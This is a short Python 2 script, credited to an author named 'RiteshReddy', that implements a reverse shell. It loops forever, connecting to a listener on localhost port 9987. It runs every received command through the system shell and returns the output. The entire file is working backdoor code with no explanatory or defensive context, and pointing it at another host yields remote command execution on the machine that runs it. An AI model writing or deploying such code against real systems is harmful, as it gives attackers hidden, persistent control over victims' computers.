__author__ = 'RiteshReddy'

import socket
import subprocess


while 1:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(("localhost", 9987))
        while 1:
            command = sock.recv(4096)
            if not command:
                break
            try:
                CMD = subprocess.check_output(command, shell=True)
                sock.send(CMD)
            except Exception,e:
                sock.send(str(e))
        sock.close()
    except Exception:
        continue
